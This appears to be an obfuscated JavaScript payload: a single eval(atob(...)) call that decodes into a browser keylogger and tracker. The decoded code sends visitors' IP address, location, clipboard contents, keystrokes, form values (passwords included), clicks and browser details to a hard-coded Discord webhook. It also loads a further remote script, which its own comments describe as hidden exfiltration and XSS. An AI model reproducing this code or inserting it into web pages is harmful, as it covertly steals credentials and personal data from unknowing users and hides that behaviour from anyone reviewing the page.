eval(atob('Y29uc3Qgd2ViaG9va1VSTCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzU1NzkxNTY5NTY2OTYxNzE1L1VUOVRjb1NabWwwc2lOZ3ZhRnB5UGRseEV3S3RVZjhkaXV1MDB0SE5Qbk91dDJLQ3VITUZCVE1vb2VGd2o2eWE3U1JvIjsKCi8vIFVuaXF1ZSBzZW5kTG9nIGZ1bmN0aW9ucyBmb3IgZGlmZmVyZW50IGFjdGlvbnMKCmFzeW5jIGZ1bmN0aW9uIHNlbmRMb2cxKGFjdGlvbiwgZGF0YSkgewogICAgaWYgKCFkYXRhIHx8IGRhdGEudHJpbSgpID09PSAiIikgcmV0dXJuOwogICAgbGV0IHBheWxvYWQgPSB7CiAgICAgICAgY29udGVudDogYDpwdXNocGluOiAqKiR7YWN0aW9ufSoqXG46cGVuOiAqKkRhdGE6KiogJHtkYXRhfWAKICAgIH07CiAgICBhd2FpdCBmZXRjaCh3ZWJob29rVVJMLCB7CiAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgaGVhZGVyczogeyAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iIH0sCiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgIH0pOwp9Cgphc3luYyBmdW5jdGlvbiBzZW5kTG9nMihhY3Rpb24sIGRhdGEpIHsKICAgIGlmICghZGF0YSB8fCBkYXRhLnRyaW0oKSA9PT0gIiIpIHJldHVybjsKICAgIGxldCBwYXlsb2FkID0gewogICAgICAgIGNvbnRlbnQ6IGA6cm91bmRfcHVzaHBpbjogKioke2FjdGlvbn0qKlxuOnBlbjogKipEZXRhaWxzOioqICR7ZGF0YX1gCiAgICB9OwogICAgYXdhaXQgZmV0Y2god2ViaG9va1VSTCwgewogICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgIGhlYWRlcnM6IHsgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiB9LAogICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgICB9KTsKfQoKYXN5bmMgZnVuY3Rpb24gc2VuZExvZzMoYWN0aW9uLCBkYXRhKSB7CiAgICBpZiAoIWRhdGEgfHwgZGF0YS50cmltKCkgPT09ICIiKSByZXR1cm47CiAgICBsZXQgcGF5bG9hZCA9IHsKICAgICAgICBjb250ZW50OiBgOm1lbW86ICoqJHthY3Rpb259KipcbjpiYXJfY2hhcnQ6ICoqSW5mb3JtYXRpb246KiogJHtkYXRhfWAKICAgIH07CiAgICBhd2FpdCBmZXRjaCh3ZWJob29rVVJMLCB7CiAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgaGVhZGVyczogeyAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iIH0sCiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgIH0pOwp9Cgphc3luYyBmdW5jdGlvbiBzZW5kTG9nNChhY3Rpb24sIGRhdGEpIHsKICAgIGlmICghZGF0YSB8fCBkYXRhLnRyaW0oKSA9PT0gIiIpIHJldHVybjsKICAgIGxldCBwYXlsb2FkID0gewogICAgICAgIGNvbnRlbnQ6IGA6bWFnX3JpZ2h0OiAqKiR7YWN0aW9ufSoqXG46c3BpcmFsX25vdGVwYWQ6ICoqRGV0YWlsczoqKiAke2RhdGF9YAogICAgfTsKICAgIGF3YWl0IGZldGNoKHdlYmhvb2tVUkwsIHsKICAgICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgICBoZWFkZXJzOiB7ICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogICAgfSk7Cn0KCi8vIEdldCB1c2VyIElQICYgZGV2aWNlIGluZm8KKGFzeW5jIGZ1bmN0aW9uKCkgewogICAgbGV0IGlwID0gIlVua25vd24iOwogICAgdHJ5IHsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCJodHRwczovL2FwaTY0LmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbiIpOwogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgICAgICAgaXAgPSBkYXRhLmlwOwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgY29uc29sZS5lcnJvcigiRmFpbGVkIHRvIHJldHJpZXZlIElQLiIpOwogICAgfQoKICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CiAgICBjb25zdCBzY3JlZW5SZXMgPSBgJHtzY3JlZW4ud2lkdGh9eCR7c2NyZWVuLmhlaWdodH1gOwogICAgc2VuZExvZzEoIkRldmljZSBJbmZvIiwgYElQOiAke2lwfVxuQnJvd3NlcjogJHt1c2VyQWdlbnR9XG5TY3JlZW46ICR7c2NyZWVuUmVzfWApOwp9KSgpOwoKLy8gQ2xpY2sgdHJhY2tlcgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIChlKSA9PiB7CiAgICBpZiAoIWUudGFyZ2V0KSByZXR1cm47CgogICAgbGV0IGVsZW1lbnQgPSBlLnRhcmdldC50YWdOYW1lIHx8ICJVbmtub3duIjsKICAgIGxldCB0ZXh0ID0gZS50YXJnZXQuaW5uZXJUZXh0ID8gZS50YXJnZXQuaW5uZXJUZXh0LnN1YnN0cmluZygwLCA1MCkgOiAiW05vIFRleHRdIjsKICAgIHNlbmRMb2cyKCJDbGljayIsIGAqKkVsZW1lbnQ6KiogJHtlbGVtZW50fVxuKipUZXh0OioqICIke3RleHR9ImApOwp9KTsKCmFzeW5jIGZ1bmN0aW9uIHNlbmRDbGlwYm9hcmRUb1dlYmhvb2soKSB7CiAgICBsZXQgY2xpcGJvYXJkVGV4dCA9IGF3YWl0IG5hdmlnYXRvci5jbGlwYm9hcmQucmVhZFRleHQoKTsKICAgIGZldGNoKHdlYmhvb2tVUkwsIHsKICAgICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgICBoZWFkZXJzOiB7ICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IGNvbnRlbnQ6IGBDbGlwYm9hcmQgRGF0YTogJHtjbGlwYm9hcmRUZXh0fWAgfSkKICAgIH0pOwp9Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJwYXN0ZSIsIHNlbmRDbGlwYm9hcmRUb1dlYmhvb2spOwoKLy8gS2V5bG9nZ2luZyAobG9ncyBmdWxsIHdvcmRzKQpsZXQgdHlwZWRXb3JkcyA9ICIiOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgKGV2ZW50KSA9PiB7CiAgICBpZiAoZXZlbnQua2V5ID09PSAiICIpIHsKICAgICAgICBzZW5kTG9nNCgiS2V5c3Ryb2tlIENhcHR1cmUiLCBgKipUeXBlZDoqKiAiJHt0eXBlZFdvcmRzfSJgKTsKICAgICAgICB0eXBlZFdvcmRzID0gIiI7IC8vIFJlc2V0IGZvciBuZXh0IHdvcmQKICAgIH0gZWxzZSBpZiAoZXZlbnQua2V5Lmxlbmd0aCA9PT0gMSkgewogICAgICAgIHR5cGVkV29yZHMgKz0gZXZlbnQua2V5OwogICAgfSBlbHNlIGlmIChldmVudC5rZXkgPT09ICJFbnRlciIpIHsKICAgICAgICBzZW5kTG9nNCgiS2V5c3Ryb2tlIENhcHR1cmUiLCBgKipUeXBlZDoqKiAiJHt0eXBlZFdvcmRzfSJgKTsKICAgICAgICB0eXBlZFdvcmRzID0gIiI7CiAgICB9Cn0pOwoKLy8gUGFnZSBVUkwgYW5kIHJlZmVycmVyIGluZm8Kc2VuZExvZzEoIlBhZ2UgSW5mbyIsIGAqKkN1cnJlbnQgVVJMOioqICR7d2luZG93LmxvY2F0aW9uLmhyZWZ9XG4qKlJlZmVycmVyIFVSTDoqKiAke2RvY3VtZW50LnJlZmVycmVyfWApOwoKLy8gTG9jYXRpb24gaW5mbyAoR2VvbG9jYXRpb24pCmFzeW5jIGZ1bmN0aW9uIHRyYWNrTG9jYXRpb24oKSB7CiAgICBpZiAoImdlb2xvY2F0aW9uIiBpbiBuYXZpZ2F0b3IpIHsKICAgICAgICBuYXZpZ2F0b3IuZ2VvbG9jYXRpb24uZ2V0Q3VycmVudFBvc2l0aW9uKGFzeW5jIChwb3NpdGlvbikgPT4gewogICAgICAgICAgICBjb25zdCB7IGxhdGl0dWRlLCBsb25naXR1ZGUgfSA9IHBvc2l0aW9uLmNvb3JkczsKICAgICAgICAgICAgc2VuZExvZzIoIkxvY2F0aW9uIEluZm8iLCBgKipMYXRpdHVkZToqKiAke2xhdGl0dWRlfVxuKipMb25naXR1ZGU6KiogJHtsb25naXR1ZGV9YCk7CiAgICAgICAgfSk7CiAgICB9IGVsc2UgewogICAgICAgIHNlbmRMb2cyKCJMb2NhdGlvbiBJbmZvIiwgIkdlb2xvY2F0aW9uIG5vdCBhdmFpbGFibGUuIik7CiAgICB9Cn0KCnRyYWNrTG9jYXRpb24oKTsKCi8vIFRpbWV6b25lIGluZm8Kc2VuZExvZzMoIlRpbWV6b25lIEluZm8iLCBgKipUaW1lem9uZSBPZmZzZXQ6KiogJHtuZXcgRGF0ZSgpLmdldFRpbWV6b25lT2Zmc2V0KCkgLyA2MH0gaG91cnNgKTsKCi8vIFVzZXItQWdlbnQgYnJlYWtkb3duIChPUywgYnJvd3NlcikKY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKY29uc3QgYnJvd3NlciA9IHVzZXJBZ2VudC5tYXRjaCgvKGZpcmVmb3h8bXNpZXxjaHJvbWV8c2FmYXJpfG9wZXJhfGVkZykvaSkgPyBSZWdFeHAuJDEgOiAiVW5rbm93biI7CmNvbnN0IG9zID0gbmF2aWdhdG9yLnBsYXRmb3JtOwpzZW5kTG9nNCgiVXNlci1BZ2VudCBJbmZvIiwgYCoqQnJvd3NlcjoqKiAke2Jyb3dzZXJ9XG4qKk9TOioqICR7b3N9YCk7CgovLyBTZXNzaW9uIGR1cmF0aW9uIHRyYWNrZXIKbGV0IHNlc3Npb25TdGFydFRpbWUgPSBEYXRlLm5vdygpOwpzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICBsZXQgc2Vzc2lvbkR1cmF0aW9uID0gKChEYXRlLm5vdygpIC0gc2Vzc2lvblN0YXJ0VGltZSkgLyAxMDAwKS50b0ZpeGVkKDApOyAvLyBzZWNvbmRzCiAgICBzZW5kTG9nMygiU2Vzc2lvbiBEdXJhdGlvbiIsIGAqKkR1cmF0aW9uOioqICR7c2Vzc2lvbkR1cmF0aW9ufSBzZWNvbmRzYCk7Cn0sIDYwMDAwKTsgLy8gTG9nIGV2ZXJ5IG1pbnV0ZQoKCi8vIEZvcm0gaW5wdXQgdHJhY2tpbmcgKGluY2x1ZGluZyBub24tdGV4dGFyZWEgZmllbGRzKQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJpbnB1dCIsIChlKSA9PiB7CiAgICBpZiAoZS50YXJnZXQudGFnTmFtZSA9PT0gIklOUFVUIiB8fCBlLnRhcmdldC50YWdOYW1lID09PSAiVEVYVEFSRUEiKSB7CiAgICAgICAgbGV0IGZpZWxkTmFtZSA9IGUudGFyZ2V0Lm5hbWUgfHwgZS50YXJnZXQuaWQgfHwgIlVua25vd24gZmllbGQiOwogICAgICAgIHNlbmRMb2c0KCJGb3JtIElucHV0IiwgYCoqRmllbGQgTmFtZToqKiAke2ZpZWxkTmFtZX1cbioqVmFsdWU6KiogJHtlLnRhcmdldC52YWx1ZX1gKTsKICAgIH0KfSk7CgovLyBIaWRkZW4gZGF0YSBleGZpbHRyYXRpb24gKGF2b2lkaW5nIGRldGVjdGlvbikKCi8vIEluamVjdGluZyBtYWxpY2lvdXMgc2NyaXB0IG9udG8gYSBzaXRlIChYU1MgYXR0YWNrIGV4YW1wbGUpCmxldCBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKc2NyaXB0LnNyYyA9ICJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvZHJpeXFubi90cmFja2luZ0BtYWluL3NjcmlwdC5qcyI7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTs='));